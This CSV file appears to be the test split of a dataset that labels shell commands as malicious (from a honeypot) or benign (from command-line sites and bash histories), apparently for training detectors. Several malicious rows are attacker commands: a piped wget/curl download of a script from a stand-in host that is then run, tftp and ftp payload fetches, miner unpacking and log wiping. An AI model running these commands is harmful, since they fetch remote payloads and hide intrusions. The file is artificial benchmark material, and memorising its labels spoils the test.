id,command,label,source,split
d2_000000,nano u.txt,1,honeypot,test
d2_000001,"perl -wlne'/title>([^<]+)/i&&rename$ARGV,""$1.html""' *.html",0,commandlinefu,test
d2_000010,"example() { echo ""EXAMPLE:""; echo; echo "" $@""; echo; echo ""OUTPUT:""; echo ; eval ""$@"" | sed 's/^/ /'; }",0,commandlinefu,test
d2_000014,"sleep 4; xwd >foo.xwd; mv foo.xwd ""$(dd skip=100 if=foo.xwd bs=1 count=256 2>/dev/null | egrep -ao '^[[:print:]]+' | tr / :).xwd""",0,commandlinefu,test
d2_000016,Zsh,0,bash_history,test
d2_000026,"mysqldump --add-drop-table --extended-insert --force --log-error=error.log -uUSER -pPASS OLD_DB_NAME | ssh -C user@newhost ""mysql -uUSER -pPASS NEW_DB_NAME""",0,commandlinefu,test
d2_000040,/bin/busybox echo -e '\x47\x72\x6f\x70/sys/firmware' > /sys/firmware/.nippon,1,honeypot,test
d2_000050,sudo nmap -sS 27.127.252.61 -D 168.95.110.156,0,commandlinefu,test
d2_000056,check_mk -v -p --debug -D --checks local control2.gate.rtf,0,bash_history,test
d2_000066,vi ./bashrc,0,bash_history,test
d2_000067,./.dhpcd,1,honeypot,test
d2_000071,31m>>>> Server Gasit incepem Testele \033[1,1,honeypot,test
d2_000085,dpigs,0,commandlinefu,test
d2_000088,/gisdfoewrsfdf,1,honeypot,test
d2_000102,find -type f -mtime -40 -ls,0,bash_history,test
d2_000108,"ls -alt|awk '{if (system(""sleep .5 && exit 2"") != 2) exit; print}'",0,commandlinefu,test
d2_000111,git remote add originster/New-1,0,bash_history,test
d2_000112,cp ~/.functions bash/,0,bash_history,test
d2_000122,cat /dev/null > /var/log/yum.log,1,honeypot,test
d2_000124,./nf88BWF9,1,honeypot,test
d2_000132,tar -zxvf mongodb-linux-x86_64-ubuntu1604-4.0.5.tgz,0,bash_history,test
d2_000141,who | gzip | base64,1,honeypot,test
d2_000143,rm -rf /var/tmp/dota*,1,honeypot,test
d2_000152,sudo arp-scan -I eth0 75.52.247.61/24,0,commandlinefu,test
d2_000154,man cruft,0,bash_history,test
d2_000163,sudo systemctl restart jenkins,0,bash_history,test
d2_000165,oc set volume dc/tasks --add --name=jboss-config --mount-path=/opt/eap/standalone/configuration/application-users.properties --sub-path=application-users.properties --configmap-name=tasks-config -n abi-tasks-dev,0,bash_history,test
d2_000186,brew uninstall --force openssl,0,bash_history,test
d2_000211,tar -zxvf 'download (1)',0,bash_history,test
d2_000217,./ygljglkjgfg0,1,honeypot,test
d2_000218,bash -c ./ptUehrfk,1,honeypot,test
d2_000239,sudo apt-get install parallel,0,bash_history,test
d2_000241,netctl-auto disable,0,bash_history,test
d2_000242,cat tmp.rwG6eULB7M.sh,1,honeypot,test
d2_000250,ls Init/,0,bash_history,test
d2_000251,"echo ""cd /tmp ; wget http://h060a0744.example.net/wget.sh || curl http://h060a0744.example.net/curl.sh -o curl.sh ; chmod +x *.sh ; ./wget.sh ; ./curl.sh"" | sh",1,honeypot,test
d2_000252,"for i in {1..30}; do ping -t $i -c 1 google.com; done | grep ""Time to live exceeded""",0,commandlinefu,test
d2_000254,sudo makedir /media/mobilehd,0,bash_history,test
d2_000255,gs -dNOPAUSE -sDEVICE=jpeg -r144 -sOutputFile=p%03d.jpg file.pdf,0,commandlinefu,test
d2_000264,alias ..='cd ..',0,commandlinefu,test
d2_000269,unzip nasa.zip,1,honeypot,test
d2_000272,"color()(set -o pipefail;""$@"" 2>&1>&3|sed $'s,.*,\e[31m&\e[m,'>&2)3>&1",0,commandlinefu,test
d2_000273,"growisofs -M /dev/dvd -J -r ""directory name with files to add to DVD""",0,commandlinefu,test
d2_000276,ls samsung/,0,bash_history,test
d2_000278,tail -f /path/to/timestamped/files/file-*(om[1]),0,commandlinefu,test
d2_000294,"echo -en ""stats\r\n"" ""quit\r\n"" | nc localhost 11211 | tr -s [:cntrl:] "" ""| cut -f42,48 -d"" "" | sed ""s/\([0-9]*\)\s\([0-9]*\)/ \2\/\1*100/"" | bc -l",0,commandlinefu,test
d2_000299,nproo,1,honeypot,test
d2_000300,make prefix=/usr/local/git all,0,bash_history,test
d2_000302,grep 1000 /isiseqruns/RonAxoTrinity/AxoMikeTest/*.sh,0,bash_history,test
d2_000304,less Trolltech.conf,0,bash_history,test
d2_000309,spotify,0,bash_history,test
d2_000327,feh -F ndriod.pic/mmexport1385385807785.jpeg,0,bash_history,test
d2_000328,tftp -r tftp2.sh -g 21.183.167.151,1,honeypot,test
d2_000333,sudo apt install jd,0,bash_history,test
d2_000336,ls -1 /etc/pam.d,1,honeypot,test
d2_000356,composer selfupdate,0,bash_history,test
d2_000368,rm -fr perl-5.10.0*,0,bash_history,test
d2_000373,chr () { printf \\$(($1/64*100+$1%64/8*10+$1%8)); },0,commandlinefu,test
d2_000386,for var in $(env | grep TF | awk -F\= '{print $1}'); do export $var; done,0,bash_history,test
d2_000407,git pull -u suresh prod,0,bash_history,test
d2_000409,sudo pacman -S gvfs,0,bash_history,test
d2_000411,/bin/busybox cat /proc/sched_debug/.nippon,1,honeypot,test
d2_000418,rpm -e --allmatches filename.rpm,0,commandlinefu,test
d2_000426,iptables -t nat -A POSTROUTING -p tcp --dport 25 -j SNAT --to-source IP_TO_ROUTE_THROUGH,0,commandlinefu,test
d2_000428,for i in *mkv; do ffmpeg -i $i -vcodec copy -acodec copy $i.mp4; done,0,bash_history,test
d2_000432,ps -el,0,bash_history,test
d2_000437,sudo pkill -9 dhclient,0,bash_history,test
d2_000444,for host in `grep 127 ad_servers.txt | awk '{ print $2 }'`;do echo $host;done,0,bash_history,test
d2_000446,"step2(){ b=""GET&https%3A%2F%2Fstream.twitter.com%2F1%2Fstatuses%2Ffilter.json&follow%3D${id}%26oauth_consumer_key%3D${k1}%26oauth_nonce%3D${once}%26oauth_signature_method%3DHMAC-SHA1%26oauth_timestamp%3D${ts}%26oauth_token%3D${k3}%26oauth_version%3D1.0"";}",0,commandlinefu,test
d2_000450,cat i3log* 2> /dev/null | tail,0,bash_history,test
d2_000451,sudo pkill -QUIT obex,0,bash_history,test
d2_000457,git checkout evaluating,0,bash_history,test
d2_000470,exercicio1403,0,bash_history,test
d2_000472,rails generate paperclip About image,0,bash_history,test
d2_000477,cp ~/Downloads/Book2.csv ./korea.csv,0,bash_history,test
d2_000479,cc -o b tcp2.c,0,bash_history,test
d2_000481,rm -rf /usr/bin/python,0,bash_history,test
d2_000483,docker -H ssh://es012.metriks.prod.s1.p.fti.net ps | grep securite_es-master,0,bash_history,test
d2_000484,xz,1,honeypot,test
d2_000490,git config --Muedkhn@gmail.com,0,bash_history,test
d2_000504,git help commit,0,bash_history,test
d2_000508,python ldr2.0,0,bash_history,test
d2_000519,sudo systemctl restart network-manager.service,0,bash_history,test
d2_000522,wget http://h7642432e.example.net/hxx,1,honeypot,test
d2_000524,ls /home/liveuser,0,bash_history,test
d2_000526,vim for,0,bash_history,test
d2_000535,git branch --help,0,bash_history,test
d2_000539,sudo pip install asgi_redis,0,bash_history,test
d2_000541,rm -rf read.txt*,1,honeypot,test
d2_000542,wget <URL> -O- | wget -i -,0,commandlinefu,test
d2_000543,sudo git remote add githubstello/presto.git,0,bash_history,test
d2_000551,./VEYWaqHT,1,honeypot,test
d2_000552,chmod 0777 syn2023,1,honeypot,test
d2_000563,rm .xinitrc.swp,0,bash_history,test
d2_000565,/bin/busybox cat /proc/sysrq-trigger/.nippon,1,honeypot,test
d2_000574,/bin/busybox cat /proc/keys/.none,1,honeypot,test
d2_000575,imv book_main.tex,0,bash_history,test
d2_000576,ansible web-servers -m setup -a 'filter=ansible_distribution',0,bash_history,test
d2_000577,git checkout develop,0,bash_history,test
d2_000578,./mysemant_b grading/staticdispatch.test > out,0,bash_history,test
d2_000582,"oc new-app --name='blue' --labels=name=""blue"" phps",0,bash_history,test
d2_000596,"sudo find / -iname ""*.lproj"" -and \! -iname ""en*"" -print0 | tee /dev/stderr | sudo xargs -0 rm -rfv",0,commandlinefu,test
d2_000599,"echo ""fjadjfjadfjadk"" > abfda.pngfdaffdfdafasdfa",0,bash_history,test
d2_000602,git remote add origins-out.git,0,bash_history,test
d2_000604,sudo chmod -R o+r *,0,bash_history,test
d2_000607,/bin/busybox rm -f /etc/hostname/.nippon,1,honeypot,test
d2_000608,sudo /edx/app/edxapp/edx-platform/openedx/core/djangoapps/content/course_overviews/models.py,0,bash_history,test
d2_000611,"function avg { awk ""/$2/{sum += \$$1; lc += 1;} END {printf \""Average over %d lines: %f\n\"", lc, sum/lc}""; }",0,commandlinefu,test
d2_000622,source /home/bjohnston/env/mine/bin/activate,0,bash_history,test
d2_000628,rm -rf sh,1,honeypot,test
d2_000635,openssl rand -hex 6 | sed 's/\(..\)/\1:/g; s/.$//',0,commandlinefu,test
d2_000641,sudo apt install textinfo,0,bash_history,test
d2_000649,sshfs /root/Desktop/mountdirectory root@remotehost:/etc/,0,commandlinefu,test
d2_000650,"touch {x,y}.ex",0,bash_history,test
d2_000655,alias ds='dig +noauthority +noadditional +noqr +nostats +noidentify +nocmd +noquestion +nocomments',0,commandlinefu,test
d2_000665,bash quiz.sh,0,bash_history,test
d2_000667,apt-get -s upgrade | awk '/Inst.+/ {print $2}',0,commandlinefu,test
d2_000668,less DOOMICIDE\ darkocean,0,bash_history,test
d2_000669,cd /var/tmp wget ftp://hc8870bf9.example.net/.mr,1,honeypot,test
d2_000682,pkill -f cyber,1,honeypot,test
d2_000686,yaourt -v,0,bash_history,test
d2_000690,hardlink -vpot .,0,commandlinefu,test
d2_000711,./u40iqkxK,1,honeypot,test
d2_000713,rm -rf /tmp/playlist.tmp && find ~/mp3 -name *.mp3 > /tmp/playlist.tmp && mplayer -playlist /tmp/playlist.tmp -shuffle -loop 0 | grep Playing,0,commandlinefu,test
d2_000716,function checkfor () { while :; do $*; sleep 5; done; },0,commandlinefu,test
d2_000719,"while true; do input tap $(wm size | awk -F 'x' '{print $1/2 "" "" $2/2}'); done",0,commandlinefu,test
d2_000720,find / -type f 2>/dev/null | xargs du 2>/dev/null | sort -n | tail -n 10 | cut -f 2 | xargs -n 1 du -h,0,commandlinefu,test
d2_000725,git rev-list --all|tail -n1|xargs git show|grep -v diff|head -n1|cut -f1-3 -d' ',0,commandlinefu,test
d2_000727,chroot --help,0,bash_history,test
d2_000731,sudo pm-suspend,0,commandlinefu,test
d2_000733,puppet resource user developer password=4linux,0,bash_history,test
d2_000735,~<TAB>,0,commandlinefu,test
d2_000738,chmod 777 3Update.sh,1,honeypot,test
d2_000750,mv store_data/ data_result,0,bash_history,test
d2_000757,ls /sys/class/hwmon/hwmon0/device/,0,bash_history,test
d2_000759,xmodmap -e 'remove Lock = Caps_Lock' && xmodmap -e 'add control = Caps_Lock',0,commandlinefu,test
d2_000762,ssh -f user@remote.ip DISPLAY=:0.0 smplayer movie.avi,0,commandlinefu,test
d2_000769,ll /lib,0,bash_history,test
d2_000770,tmp=$(wpa_cli scan_result | awk {'print $5'} | awk 'NR > 2' | grep -oFf <(wpa_cli list_networks | awk {'print $2'} | awk 'NR > 2') | grep -vFf - <(wpa_cli scan_results | awk {'print $5'} | awk 'NR > 2'),0,bash_history,test
d2_000776,set|grep -i tmout,0,bash_history,test
d2_000780,brew uninstall net-snmp,0,bash_history,test
d2_000781,git gommit -m 'initial commit',0,bash_history,test
d2_000790,lynx localhost,0,bash_history,test
d2_000795,tar xvf miner.tar,1,honeypot,test
d2_000796,make check,0,bash_history,test
d2_000798,ifconfig | convert label:@- ip.png,0,commandlinefu,test
d2_000814,sh 18064.sh,1,honeypot,test
d2_000817,distance,1,honeypot,test
d2_000820,nslookup cnn.com 27.75.34.196,0,bash_history,test
d2_000833,sort -F kp.txt,0,bash_history,test
d2_000846,var=host ;while ! nc -zw 1 $var 22;do sleep 1; done ; ssh user@$var,0,commandlinefu,test
d2_000847,whereis jenkins,0,bash_history,test
